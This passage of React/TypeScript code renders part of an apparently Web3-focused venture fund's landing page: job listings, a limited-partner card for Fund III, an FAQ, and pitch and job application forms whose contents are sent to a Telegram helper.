                  <div className="job-logo-wrap">
                    <img src={job.logo} alt={job.company} className="job-logo" loading="lazy" onError={(e) => {
                      const el = e.target as HTMLImageElement;
                      el.style.display = 'none';
                      const fallback = document.createElement('div');
                      fallback.className = 'job-logo-fallback';
                      fallback.textContent = job.company.charAt(0);
                      el.parentElement?.appendChild(fallback);
                    }} />
                  </div>
                  <div className="job-title">{job.role}</div>
                  <div className="job-company">{job.company}</div>
                  <div className="job-location">{job.location}</div>
                  <div className="job-apply">Apply Now</div>
                </button>
              ))}
            </div>
          </div>
        </section>

        <section id="lp" className="section-lp border-top">
          <div className="container">
            <div className="lp-inner">
              <div className="lp-left animate-up">
                <span className="label">/ 09. LIMITED PARTNERS</span>
                <h2>Partner<br />as an LP.</h2>
                <p>Explore Fund III and learn how we create value across Web3. We work with family offices, institutional allocators, and high-conviction individuals who want direct exposure to frontier technology.</p>
                <a href="mailto:lp@girana.fund" className="lp-btn">Request LP Deck &rarr;</a>
              </div>
              <div className="lp-right animate-up">
                <LPCard />
              </div>
            </div>
          </div>
        </section>

        <section id="faq" className="section border-top">
          <div className="container">
            <span className="label">/ 10. FREQUENTLY ASKED</span>
            <div className="faq-grid">
              <div className="faq-left animate-up">
                <h2>Questions<br /><span className="outline">answered.</span></h2>
              </div>
              <div className="faq-right">
                {FAQ_DATA.map((item, i) => (
                  <div key={i} className={`faq-item animate-up ${openFaq === i ? 'open' : ''}`}>
                    <button className="faq-question" onClick={() => setOpenFaq(openFaq === i ? null : i)}>
                      <span>{item.q}</span>
                      <span className="faq-toggle">{openFaq === i ? '−' : '+'}</span>
                    </button>
                    <div className="faq-answer">
                      <p>{item.a}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </section>

        <PitchSection />

        <footer className="footer border-top">
          <div className="container footer-content">
            <div className="footer-top">
              <span className="label">/ CONTACT</span>
              <a href="mailto:hello@girana.fund" className="big-mail">hello@girana.fund</a>
            </div>
            <div className="footer-bottom">
              <div className="footer-legal">
                <p>&copy; 2026 GIRANA.FUND. ALL RIGHTS RESERVED.</p>
                <p>PRIVATE &amp; CONFIDENTIAL.</p>
              </div>
              <div className="footer-mid">
                <a href="#portfolio">PORTFOLIO</a>
                <a href="#founders">FOUNDERS</a>
                <a href="#process">PROCESS</a>
                <a href="#faq">FAQ</a>
              </div>
              <div className="footer-links">
                <a href="#">MANIFESTO</a>
                <a href="#">LEGAL</a>
                <a href="#">X / TWITTER</a>
              </div>
            </div>
          </div>
        </footer>
      </main>

      <JobModal job={selectedJob} onClose={() => setSelectedJob(null)} />
      <ScrollToTop />
    </div>
    </>
  );
}

function LPCard() {
  const cardRef = useRef<HTMLDivElement>(null);

  const handleMouseMove = (e: React.MouseEvent<HTMLDivElement>) => {
    if (!cardRef.current) return;
    const rect = cardRef.current.getBoundingClientRect();
    const x = ((e.clientX - rect.left) / rect.width) * 100;
    const y = ((e.clientY - rect.top) / rect.height) * 100;
    cardRef.current.style.background = `radial-gradient(circle at ${x}% ${y}%, rgba(255,255,255,0.04) 0%, transparent 60%)`;
  };

  const handleMouseLeave = () => {
    if (!cardRef.current) return;
    cardRef.current.style.background = "";
  };

  return (
    <div 
      className="lp-card" 
      ref={cardRef}
      onMouseMove={handleMouseMove}
      onMouseLeave={handleMouseLeave}
    >
      <div className="lp-card-label">FUND III</div>
      <div className="lp-card-amount">$50M</div>
      <div className="lp-card-desc">Target raise</div>
      <div className="lp-card-divider"></div>
      <div className="lp-card-row">
        <span>Focus</span>
        <span>Web3 Infrastructure &amp; AI</span>
      </div>
      <div className="lp-card-row">
        <span>Stage</span>
        <span>Pre-seed &rarr; Series A</span>
      </div>
      <div className="lp-card-row">
        <span>Geography</span>
        <span>Global</span>
      </div>
      <div className="lp-card-row">
        <span>Min. Ticket</span>
        <span>$250K</span>
      </div>
    </div>
  );
}

function PitchSection() {
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const form = e.currentTarget;
    
    // Honeypot check (add honeypot field later if needed, but not required yet)
    
    setStatus('sending');
    const formData = new FormData(form);
    const data = {
      founder: formData.get('founder') as string,
      email: formData.get('email') as string,
      project: formData.get('project') as string,
      stage: formData.get('stage') as string,
      description: formData.get('description') as string,
      deck: formData.get('deck') as string
    };

    try {
      const text = `🚀 <b>New Pitch Application</b>\n\n<b>Founder:</b> ${data.founder}\n<b>Project:</b> ${data.project} (${data.stage})\n<b>Email:</b> ${data.email}\n<b>Description:</b>\n${data.description}\n\n<b>Deck/Docs:</b> ${data.deck || 'Not provided'}`;
      await sendToTelegram(text);
      setStatus('success');
      form.reset();
      setTimeout(() => setStatus('idle'), 5000);
    } catch {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 5000);
    }
  };

  return (
    <section id="pitch" className="section-pitch border-top">
      <div className="container">
        <div className="pitch-header animate-up">
          <span className="label">/ 09. APPLY</span>
          <h2>Pitch your<br /><span className="outline">startup.</span></h2>
          <p>Share your vision, traction, and what you're building &mdash; we review every application. Most deals move from the first conversation to a signed agreement in just one week.</p>
        </div>
        <form className="pitch-form animate-up" onSubmit={handleSubmit}>
          <div className="form-row">
            <div className="form-field">
              <label>FOUNDER NAME</label>
              <input type="text" name="founder" placeholder="Alex Smith" required />
            </div>
            <div className="form-field">
              <label>EMAIL</label>
              <input type="email" name="email" placeholder="you@project.xyz" required />
            </div>
          </div>
          <div className="form-row">
            <div className="form-field">
              <label>PROJECT NAME</label>
              <input type="text" name="project" placeholder="Protocol name" required />
            </div>
            <div className="form-field">
              <label>STAGE</label>
              <select name="stage" required>
                <option value="">Select stage</option>
                <option value="Idea / Pre-seed">Idea / Pre-seed</option>
                <option value="Seed">Seed</option>
                <option value="Series A">Series A</option>
                <option value="Series B+">Series B+</option>
              </select>
            </div>
          </div>
          <div className="form-field form-field--full">
            <label>WHAT ARE YOU BUILDING?</label>
            <textarea name="description" placeholder="Describe your protocol, technology, and the problem it solves..." required></textarea>
          </div>
          <div className="form-row form-row--end">
            <div className="form-field">
              <label>DECK / DOCS LINK</label>
              <input type="url" name="deck" placeholder="https://notion.so/..." />
            </div>
            <button type="submit" className="form-submit" disabled={status === 'submitting'}>
              <span className="btn-text">
                {status === 'idle' ? 'SUBMIT APPLICATION' : status === 'submitting' ? 'SENDING...' : 'SENT ✓'}
              </span>
              <span className="btn-arrow">&rarr;</span>
            </button>
          </div>
          <div className={`form-success ${status === 'success' ? 'visible' : ''}`}>
            <span>✓</span> Congratulations, your message has been delivered and you will receive a response soon.
          </div>
        </form>
      </div>
    </section>
  );
}

function JobModal({ job, onClose }: { job: any, onClose: () => void }) {
  const [status, setStatus] = useState<'idle' | 'submitting' | 'success'>('idle');

  if (!job) return null;

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setStatus('submitting');
    
    const formData = new FormData(e.currentTarget);
    const data = {
      name: formData.get('name'),
      email: formData.get('email'),
      link: formData.get('link'),
      cover: formData.get('cover')
    };

    const message = `
💼 <b>New Job Application</b>

<b>Role:</b> ${job.role}
<b>Company:</b> ${job.company}

<b>Candidate:</b> ${data.name}
<b>Email:</b> ${data.email}
<b>LinkedIn/Portfolio:</b> ${data.link || 'Not provided'}

<b>Cover Letter:</b>
${data.cover}
    `;

    try {
      await sendToTelegram(message);
      setStatus('success');
      e.currentTarget.reset();
      setTimeout(() => {
        onClose();
        setStatus('idle');
      }, 2000);
    } catch (error) {
      console.error(error);
      setStatus('idle');
      alert('Failed to send application. Please try again later.');
    }
  };

  return (
    <div className={`modal-overlay ${job ? 'open' : ''}`} onClick={onClose}>
      <div className="modal-content" onClick={e => e.stopPropagation()}>
        <div className="modal-header">
          <div>
            <h3>{job.role}</h3>
            <p>{job.company} &middot; {job.location}</p>
          </div>
          <button className="modal-close" onClick={onClose}>
            <X size={24} />
          </button>
        </div>
        <div className="modal-body">
          <form className="pitch-form" style={{ border: 'none' }} onSubmit={handleSubmit}>
            <div className="form-row">
              <div className="form-field">
                <label>FULL NAME</label>
                <input type="text" name="name" placeholder="Alex Smith" required />
              </div>
              <div className="form-field">
                <label>EMAIL</label>
                <input type="email" name="email" placeholder="you@email.com" required />
              </div>
            </div>
            <div className="form-field form-field--full">
              <label>LINKEDIN / PORTFOLIO</label>
              <input type="url" name="link" placeholder="https://linkedin.com/in/..." />
            </div>
            <div className="form-field form-field--full">
              <label>COVER LETTER / WHY YOU?</label>
              <textarea name="cover" placeholder="Tell us about your experience..." required></textarea>
            </div>
            <div className="form-row form-row--end" style={{ borderTop: '1px solid var(--border)' }}>
              <div className="form-field" style={{ borderRight: 'none', padding: '20px' }}>
                {status === 'success' && <span style={{ color: '#fff', fontFamily: 'var(--mono)', fontSize: '11px' }}>✓ Congratulations, your message has been delivered and you will receive a response soon.</span>}
              </div>
              <button type="submit" className="form-submit" disabled={status === 'submitting'}>
                <span className="btn-text">
                  {status === 'idle' ? 'APPLY NOW' : status === 'submitting' ? 'SENDING...' : 'SENT ✓'}
                </span>
                <span className="btn-arrow">&rarr;</span>
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
